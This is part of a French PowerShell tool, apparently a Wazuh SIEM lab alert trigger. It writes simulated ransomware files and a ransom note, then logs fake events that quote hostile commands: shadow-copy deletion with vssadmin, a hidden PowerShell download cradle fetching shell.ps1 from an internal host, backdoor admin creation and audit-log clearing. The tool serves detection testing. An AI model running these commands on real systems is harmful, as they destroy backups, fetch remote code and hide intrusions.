function Invoke-Level14_15 {
    Write-Banner "NIVEAU 14-15 : Urgences / Intrusions confirmees (Emergency)"

    Write-Step "Simulation ransomware - chiffrement massif de fichiers" "L14"
    for ($i = 1; $i -le 20; $i++) {
        $RansomFile = "$($Script:TestDir)\document_$i.encrypted"
        Create-TestFile -Path $RansomFile -Content "ENCRYPTED_DATA_$(Get-Random -Minimum 100000 -Maximum 999999)_$([Guid]::NewGuid())"
    }

    Write-Step "Note de rancon (simulation)" "L14"
    Create-TestFile -Path "$($Script:TestDir)\README_DECRYPT.txt" -Content "VOS FICHIERS ONT ETE CHIFFRES.`nEnvoyez 1 BTC a l'adresse: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`nContact: ransom@darkweb.onion`nCle de dechiffrement: WAZUH_TEST_SIMULATION_KEY"

    Write-Step "Suppression de shadow copies (EventID 4103)" "L14"
    Write-CustomEventLog -EventID 4103 -Message "Wazuh test: Module PowerShell - Pipeline execute: Get-WmiObject Win32_ShadowCopy | ForEach-Object { `$_.Delete() }. Ceci supprime toutes les copies shadow du systeme." -EventType 2
    Write-CustomEventLog -EventID 4103 -Message "Wazuh test: Module PowerShell - Pipeline execute: vssadmin delete shadows /all /quiet" -EventType 2

    Write-Step "Changement de mot de passe administrateur (EventID 4724)" "L15"
    Write-CustomEventLog -EventID 4724 -Message "Wazuh test: Une tentative de reinitialisation du mot de passe a ete effectuee. Compte cible: Administrator. Compte initiateur: $env:USERNAME." -EventType 2

    Write-Step "Ajout d'un utilisateur au groupe administrateurs (EventID 4732)" "L15"
    Write-CustomEventLog -EventID 4732 -Message "Wazuh test: Un membre a ete ajoute a un groupe local de securite. Groupe: Administrateurs. Membre ajoute: HackerAccount. Compte initiateur: $env:USERNAME." -EventType 2

    Write-Step "Connexion backdoor etablie (reverse shell pattern)" "L15"
    Write-CustomEventLog -EventID 4688 -Message "Wazuh test: Processus cree - powershell.exe. Ligne de commande: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100:8080/shell.ps1'). Adresse source: 10.0.0.100:8080." -EventType 2

    Write-Step "Destruction d'indices - nettoyage des logs" "L15"
    Write-CustomEventLog -EventID 1102 -Message "Wazuh test: Le journal d'audit a ete efface. Compte: $env:USERNAME." -EventType 2
    Write-CustomEventLog -EventID 104 -Message "Wazuh test: Le journal des evenements de securite a ete efface." -LogName "Security" -EventType 2

    Register-LevelResult -Levels @(14, 15) -Status "Success" -Comment "27 actions executees"
}

# ============================================================
# 6. NETTOYAGE
# ============================================================
function Invoke-Cleanup {
    Write-Banner "NETTOYAGE - Suppression des artefacts de test"

    Write-Step "Suppression des fichiers dans $($Script:TestDir)" "CLEAN"
    if (Test-Path $Script:TestDir) {
        try {
            Remove-Item -Path $Script:TestDir -Recurse -Force -ErrorAction Stop
            Write-Ok "Repertoire $($Script:TestDir) supprime"
        } catch {
            Write-Fail "Impossible de supprimer $($Script:TestDir) : $_"
        }
    }

    Write-Step "Nettoyage du registre" "CLEAN"
    try {
        Remove-Item -Path "HKCU:\Software\WazuhTest" -Recurse -Force -ErrorAction Stop
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WazuhTestPersistence" -ErrorAction Stop
        Write-Ok "Registre nettoye"
    } catch {
        Write-Log -Message "  Registre deja propre ou inaccessible" -Severity WARN
    }

    Write-Step "Nettoyage des taches planifiees" "CLEAN"
    Unregister-ScheduledTask -TaskName "WazuhTestTask" -Confirm:$false -ErrorAction SilentlyContinue
    Write-Ok "Taches planifiees verifiees"

    Write-Step "Suppression de la source d'evenements" "CLEAN"
    try {
        [System.Diagnostics.EventLog]::DeleteEventSource($Script:EventSource) -ErrorAction Stop
        Write-Ok "Source d'evenements '$($Script:EventSource)' supprimee"
    } catch {
        Write-Warn "Impossible de supprimer la source d'evenements (peut-etre deja supprimee) : $_"
    }

    Write-Log -Message "Nettoyage termine" -Severity OK
}

# ============================================================
# 7. RAPPORT (Console / JSON / HTML)
# ============================================================
function Get-ExecutionSummary {
    $EndTime = Get-Date
    $Duration = $EndTime - $Script:StartTime

    # Determiner les niveaux effectivement executes
    $ExecutedLevels = $Script:LevelResults | ForEach-Object { $_.Level } | Sort-Object -Unique

    # Compter les niveaux avec echec
    $FailedLevels = ($Script:LevelResults | Where-Object { $_.Status -eq "Failed" }).Level | Sort-Object -Unique

    $Summary = @{
        Machine        = $env:COMPUTERNAME
        User           = $env:USERNAME
        Date           = $Script:StartTime.ToString("yyyy-MM-dd HH:mm:ss")
        EndTime        = $EndTime.ToString("yyyy-MM-dd HH:mm:ss")
        Duration       = "{0:hh\:mm\:ss}" -f $Duration
        Mode           = if ($Random) { "Random" } elseif ($Level -gt 0) { "Niveau $Level" } elseif ($SkipDangerous) { "Tous (sauf 12-15)" } else { "Tous (1-15)" }
        WhatIf         = [bool]$WhatIfPreference
        LevelsExecuted = @($ExecutedLevels)
        LevelCount     = $ExecutedLevels.Count
        SuccessCount   = $Script:TotalSuccess
        FailCount      = $Script:TotalFailed
        FailedLevels   = @($FailedLevels)
        LogFile        = $Script:LogFile
        Details        = @($Script:LevelResults)
    }
    return $Summary
}

function Write-ReportConsole {
    param([hashtable]$Summary)

    Write-Host ""
    Write-Host "  ================================================================  " -ForegroundColor White
    Write-Host "  |                    RAPPORT D'EXECUTION                        |  " -ForegroundColor White
    Write-Host "  ================================================================  " -ForegroundColor White
    Write-Host ""
    Write-Host "  Machine            : " -NoNewline; Write-Host $Summary.Machine -ForegroundColor Cyan
    Write-Host "  Utilisateur        : " -NoNewline; Write-Host $Summary.User -ForegroundColor Cyan
    Write-Host "  Date execution     : " -NoNewline; Write-Host $Summary.Date -ForegroundColor Cyan
    Write-Host "  Mode               : " -NoNewline; Write-Host $Summary.Mode -ForegroundColor Yellow
    if ($Summary.WhatIf) {
        Write-Host "  WhatIf             : " -NoNewline; Write-Host "OUI (simulation)" -ForegroundColor Magenta
    }
    Write-Host ""
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""

    # Tableau des niveaux
    Write-Host "  Niveaux executes   : " -NoNewline
    Write-Host $($Summary.LevelsExecuted -join ", ") -ForegroundColor Green
    Write-Host ""

    Write-Host "  Niveaux testes     : " -NoNewline; Write-Host $Summary.LevelCount -ForegroundColor White
    Write-Host "  Actions reussies   : " -NoNewline; Write-Host $Summary.SuccessCount -ForegroundColor Green
    Write-Host "  Actions echouees   : " -NoNewline
    if ($Summary.FailCount -gt 0) {
        Write-Host $Summary.FailCount -ForegroundColor Red
    } else {
        Write-Host $Summary.FailCount -ForegroundColor Green
    }
    Write-Host "  Duree totale       : " -NoNewline; Write-Host $Summary.Duration -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""

    # Detail par niveau
    Write-Host "  DETAIL PAR NIVEAU :" -ForegroundColor Yellow
    Write-Host ""
    foreach ($Detail in $Summary.Details) {
        $StatusIcon = switch ($Detail.Status) {
            "Success" { "[OK]  "; "Green" }
            "Partial" { "[!!]  "; "DarkYellow" }
            "Failed"  { "[FAIL]"; "Red" }
            default   { "[??]  "; "Gray" }
        }
        Write-Host "    $($StatusIcon[0]) Niveau " -NoNewline
        Write-Host "$($Detail.Level.ToString().PadLeft(2))" -NoNewline -ForegroundColor White
        Write-Host " : $($Detail.Status.PadRight(8))" -NoNewline -ForegroundColor $StatusIcon[1]
        Write-Host " - $($Detail.Comment)" -ForegroundColor DarkGray
    }
    Write-Host ""
    Write-Host "  Fichier de log     : " -NoNewline; Write-Host $Summary.LogFile -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  ================================================================  " -ForegroundColor Green
    Write-Host ""
}

function Write-ReportJSON {
    param([hashtable]$Summary)
    $ReportPath = Join-Path $Script:LogDir "$($Script:LogTimestamp)_report.json"
    try {
        $Summary | ConvertTo-Json -Depth 5 | Set-Content -Path $ReportPath -Encoding UTF8 -ErrorAction Stop
        Write-Host ""
        Write-Host "  Rapport JSON genere : $ReportPath" -ForegroundColor Green
        Write-Host ""
    } catch {
        Write-Fail "Impossible de generer le rapport JSON : $_"
    }
}

function Write-ReportHTML {
    param([hashtable]$Summary)
    $ReportPath = Join-Path $Script:LogDir "$($Script:LogTimestamp)_report.html"

    $Rows = ""
    foreach ($Detail in $Summary.Details) {
        $RowColor = switch ($Detail.Status) {
            "Success" { "#2ecc71" }
            "Partial" { "#f39c12" }
            "Failed"  { "#e74c3c" }
            default   { "#95a5a6" }
        }
        $Rows += "<tr><td style='text-align:center;font-weight:bold;'>$($Detail.Level)</td>"
        $Rows += "<td style='color:$RowColor;font-weight:bold;text-align:center;'>$($Detail.Status)</td>"
        $Rows += "<td>$($Detail.Comment)</td>"
        $Rows += "<td style='color:gray;font-size:0.85em;'>$($Detail.Timestamp)</td></tr>`n"
    }

    $FailIndicator = if ($Summary.FailCount -gt 0) { "#e74c3c" } else { "#2ecc71" }
    $WhatIfBadge = if ($Summary.WhatIf) { "<span style='background:#9b59b6;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.8em;'>WHAT IF</span>" } else { "" }

    $Html = @"
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Wazuh Alert Trigger - Rapport</title>
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
    .container { max-width: 900px; margin: 0 auto; background: #16213e; border-radius: 12px; padding: 30px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
    h1 { color: #00d4ff; text-align: center; margin-bottom: 5px; font-size: 1.8em; }
    .subtitle { text-align: center; color: #888; margin-bottom: 25px; font-size: 0.9em; }
    .meta { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; }
    .meta-item { background: #0f3460; padding: 12px 15px; border-radius: 8px; border-left: 3px solid #00d4ff; }
    .meta-label { color: #888; font-size: 0.8em; text-transform: uppercase; letter-spacing: 1px; }
    .meta-value { color: #fff; font-size: 1.1em; font-weight: bold; margin-top: 4px; }
    .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 25px; }
    .stat-card { background: #0f3460; padding: 15px; border-radius: 8px; text-align: center; }
    .stat-number { font-size: 2em; font-weight: bold; color: #00d4ff; }
    .stat-label { color: #888; font-size: 0.8em; margin-top: 5px; text-transform: uppercase; }
    table { width: 100%; border-collapse: collapse; margin-top: 15px; }
    th { background: #0f3460; color: #00d4ff; padding: 12px; text-align: left; font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px; }
    td { padding: 10px 12px; border-bottom: 1px solid #1a1a3e; }
    tr:hover { background: #1a1a3e; }
    .badge { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 0.8em; font-weight: bold; color: #fff; }
    .badge-success { background: #2ecc71; }
    .badge-partial { background: #f39c12; }
    .badge-failed  { background: #e74c3c; }
    .footer { text-align: center; color: #555; margin-top: 25px; font-size: 0.8em; }
</style>
</head>
<body>
<div class="container">
    <h1>Wazuh SIEM - Alert Trigger Report</h1>
    <p class="subtitle">Rapport de test genere le $($Summary.Date) $WhatIfBadge</p>

    <div class="meta">
        <div class="meta-item"><div class="meta-label">Machine</div><div class="meta-value">$($Summary.Machine)</div></div>
        <div class="meta-item"><div class="meta-label">Utilisateur</div><div class="meta-value">$($Summary.User)</div></div>
        <div class="meta-item"><div class="meta-label">Mode</div><div class="meta-value">$($Summary.Mode)</div></div>
        <div class="meta-item"><div class="meta-label">Duree</div><div class="meta-value">$($Summary.Duration)</div></div>
    </div>

    <div class="stats">
        <div class="stat-card"><div class="stat-number">$($Summary.LevelCount)</div><div class="stat-label">Niveaux</div></div>
        <div class="stat-card"><div class="stat-number" style="color:#2ecc71;">$($Summary.SuccessCount)</div><div class="stat-label">Succes</div></div>
        <div class="stat-card"><div class="stat-number" style="color:$FailIndicator;">$($Summary.FailCount)</div><div class="stat-label">Echecs</div></div>
        <div class="stat-card"><div class="stat-number">$($Summary.Duration)</div><div class="stat-label">Temps total</div></div>
    </div>

    <h2 style="color:#00d4ff;font-size:1.2em;">Detail par niveau</h2>
    <table>
        <tr><th style="text-align:center;">Niveau</th><th style="text-align:center;">Statut</th><th>Description</th><th>Timestamp</th></tr>
        $Rows
    </table>

    <p class="footer">Wazuh Alert Trigger v2.0 - Laboratoire de test SIEM</p>
</div>
</body>
</html>
"@
    try {
        $Html | Set-Content -Path $ReportPath -Encoding UTF8 -ErrorAction Stop
        Write-Host ""
        Write-Host "  Rapport HTML genere : $ReportPath" -ForegroundColor Green
        Write-Host ""
    } catch {
        Write-Fail "Impossible de generer le rapport HTML : $_"
    }
}

function Invoke-Report {
    $Summary = Get-ExecutionSummary
    switch ($ReportFormat) {
        "Console" { Write-ReportConsole -Summary $Summary }
        "JSON"    { Write-ReportJSON -Summary $Summary; Write-ReportConsole -Summary $Summary }
        "HTML"    { Write-ReportHTML -Summary $Summary; Write-ReportConsole -Summary $Summary }
    }
}

# ============================================================
# 8. EXECUTEUR DE NIVEAUX
# ============================================================
$LevelFunctions = @{
    "1_2"   = { Invoke-Level1_2 }
    "3"     = { Invoke-Level3 }
    "4"     = { Invoke-Level4 }
    "5"     = { Invoke-Level5 }
    "6"     = { Invoke-Level6 }
    "7"     = { Invoke-Level7 }
    "8"     = { Invoke-Level8 }
    "9"     = { Invoke-Level9 }
    "10"    = { Invoke-Level10 }
    "11"    = { Invoke-Level11 }
    "12_13" = { Invoke-Level12_13 }
    "14_15" = { Invoke-Level14_15 }
}

$LevelProgressMap = @{
    "1_2"   = @{ Label = "Niveaux 1-2"; Pct = 7  }
    "3"     = @{ Label = "Niveau 3";    Pct = 13 }
    "4"     = @{ Label = "Niveau 4";    Pct = 20 }
    "5"     = @{ Label = "Niveau 5";    Pct = 27 }
    "6"     = @{ Label = "Niveau 6";    Pct = 33 }
    "7"     = @{ Label = "Niveau 7";    Pct = 40 }
    "8"     = @{ Label = "Niveau 8";    Pct = 47 }
    "9"     = @{ Label = "Niveau 9";    Pct = 53 }
    "10"    = @{ Label = "Niveau 10";   Pct = 60 }
    "11"    = @{ Label = "Niveau 11";   Pct = 67 }
    "12_13" = @{ Label = "Niveaux 12-13"; Pct = 80 }
    "14_15" = @{ Label = "Niveaux 14-15"; Pct = 93 }
}

# Determine les niveaux a executer
function Get-LevelsToRun {
    param([bool]$IsLoopIteration = $false)

    if ($IsLoopIteration) {
        # En mode loop, choisir 1-2 niveaux aleatoires
        $Keys = $LevelFunctions.Keys | Sort-Object
        $Count = Get-Random -Minimum 1 -Maximum 3
        return ($Keys | Get-Random -Count $Count)
    }

    if ($Level -gt 0) {
        # Mode niveau specifique
        switch ($Level) {
            { $_ -in 1, 2 }  { return @("1_2") }
            3                 { return @("3") }
            4                 { return @("4") }
            5                 { return @("5") }
            6                 { return @("6") }
            7                 { return @("7") }
            8                 { return @("8") }
            9                 { return @("9") }
            10                { return @("10") }
            11                { return @("11") }
            { $_ -in 12, 13 } { return @("12_13") }
            { $_ -in 14, 15 } { return @("14_15") }
        }
    }

    if ($Random) {
        # Mode aleatoire : 3 a 5 groupes de niveaux
        $Keys = $LevelFunctions.Keys | Sort-Object
        $Count = Get-Random -Minimum 3 -Maximum 6
        return ($Keys | Get-Random -Count $Count)
    }

    # Mode par defaut : tous
    if ($SkipDangerous) {
        return @("1_2", "3", "4", "5", "6", "7", "8", "9", "10", "11")
    }
    return @("1_2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12_13", "14_15")
}

# ============================================================
# 9. EXECUTION PRINCIPALE
# ============================================================
function Invoke-Main {
    Clear-Host

    Write-Host ""
    Write-Host "  ================================================================  " -ForegroundColor Red
    Write-Host "  ||                                                              ||  " -ForegroundColor Red
    Write-Host "  ||  WAZUH SIEM - ALERT TRIGGER v1.0 (PRO EDITION) | DilaneNg    ||  " -ForegroundColor Red
    Write-Host "  ||           ENVIRONNEMENT DE TEST UNIQUEMENT                   ||  " -ForegroundColor Yellow
    Write-Host "  ||                                                              ||  " -ForegroundColor Red
    Write-Host "  ================================================================  " -ForegroundColor Red
    Write-Host ""
    Write-Host "  Date           : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor White
    Write-Host "  Machine        : $env:COMPUTERNAME" -ForegroundColor White
    Write-Host "  User           : $env:USERNAME" -ForegroundColor White
    Write-Host "  Privileges     : Administrateur " -NoNewline; Write-Host "[OK]" -ForegroundColor Green
    Write-Host "  Log            : $Script:LogFile" -ForegroundColor DarkGray
    Write-Host ""

    if ($WhatIfPreference) {
        Write-Host "  *** MODE SIMULATION (WhatIf) - Aucune action ne sera executee ***" -ForegroundColor Magenta
        Write-Host ""
    }

    # Afficher le mode d'execution
    if ($Loop) {
        Write-Host "  Mode           : " -NoNewline; Write-Host "CONTINU (toutes les $LoopInterval secondes, Ctrl+C pour arreter)" -ForegroundColor Yellow
    } elseif ($Random) {
        Write-Host "  Mode           : " -NoNewline; Write-Host "ALEATOIRE (3-5 niveaux)" -ForegroundColor Yellow
    } elseif ($Level -gt 0) {
        Write-Host "  Mode           : " -NoNewline; Write-Host "NIVEAU SPECIFIQUE = $Level" -ForegroundColor Yellow
    } elseif ($SkipDangerous) {
        Write-Host "  Mode           : " -NoNewline; Write-Host "TOUS LES NIVEAUX (sauf 12-15)" -ForegroundColor Yellow
    } else {
        Write-Host "  Mode           : " -NoNewline; Write-Host "TOUS LES NIVEAUX (1-15)" -ForegroundColor Yellow
    }

    Write-Host "  Rapport        : " -NoNewline; Write-Host $ReportFormat -ForegroundColor Cyan
    Write-Host ""

    if (-not $Loop) {
        Write-Host "  Appuyez sur une touche pour commencer (ou Ctrl+C pour annuler)..." -ForegroundColor White
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    } else {
        Write-Host "  Demarrage dans 3 secondes... (Ctrl+C pour annuler)" -ForegroundColor Yellow
        Start-Sleep -Seconds 3
    }

    Write-Log -Message "=== WAZUH ALERT TRIGGER v2.0 DEMARRE ===" -Severity INFO
    Write-Log -Message "Machine: $env:COMPUTERNAME | User: $env:USERNAME | Mode: $(if($Loop){'Loop'}elseif($Random){'Random'}elseif($Level -gt 0){'Level $Level'}elseif($SkipDangerous){'All (safe)'}else{'All'})" -Severity INFO

    $Iteration = 0

    try {
        do {
            $Iteration++
            $LevelsToRun = Get-LevelsToRun -IsLoopIteration ($Loop -and $Iteration -gt 1)

            if ($Loop) {
                Write-Host ""
                Write-Host "  >>> ITERATION #$Iteration - $(Get-Date -Format 'HH:mm:ss') <<<" -ForegroundColor Magenta
                Write-Log -Message "=== ITERATION #$Iteration ===" -Severity INFO
            }

            # Reinitialiser les compteurs pour chaque iteration
            if ($Loop -and $Iteration -gt 1) {
                $Script:TotalSuccess = 0
                $Script:TotalFailed = 0
                $Script:LevelResults = [System.Collections.ArrayList]::new()
            }

            $TotalSteps = $LevelsToRun.Count
            $StepIndex = 0

            foreach ($LvlKey in $LevelsToRun) {
                $StepIndex++
                $ProgressInfo = $LevelProgressMap[$LvlKey]
                $Pct = if ($TotalSteps -eq 1) { 50 } else {
                    [math]::Round(($StepIndex / $TotalSteps) * 100)
                }

                Update-Progress -Status $ProgressInfo.Label -PercentComplete $Pct

                # Executer la fonction du niveau
                try {
                    & $LevelFunctions[$LvlKey]
                } catch {
                    Write-Fail "Erreur inattendue lors du niveau $LvlKey : $_"
                    Write-Log -Message "EXCEPTION niveau $LvlKey : $_" -Severity FAIL
                }
            }

            Update-Progress -Status "Nettoyage..." -PercentComplete 97
            Invoke-Cleanup

            Update-Progress -Status "Generation du rapport..." -PercentComplete 100

            if ($Loop) {
                Invoke-Report
                Write-Host ""
                Write-Host "  Prochaine iteration dans $LoopInterval secondes... (Ctrl+C pour arreter)" -ForegroundColor DarkCyan
                Start-Sleep -Seconds $LoopInterval
            }

        } while ($Loop)

    } finally {
        Write-Progress -Activity "Wazuh Alert Trigger v2.0" -Completed
    }

    # Rapport final
    Invoke-Report

    Write-Host "  ================================================================  " -ForegroundColor Green
    Write-Host "  ||         TEST TERMINE AVEC SUCCES ! | By DilaneNg             ||" -ForegroundColor Green
    Write-Host "  ||                                                              ||  " -ForegroundColor Green
    Write-Host "  ||  Verifiez votre dashboard Wazuh pour les alertes generees.   ||  " -ForegroundColor Cyan
    Write-Host "  ||  Les alertes peuvent prendre 30-60 secondes pour apparaitre. ||  " -ForegroundColor Cyan
    Write-Host "  ||                                                              ||  " -ForegroundColor Green
    Write-Host "  ================================================================  " -ForegroundColor Green
    Write-Host ""

    Write-Log -Message "=== WAZUH ALERT TRIGGER v1.0 TERMINE ===" -Severity INFO
}

# Lancer
Invoke-Main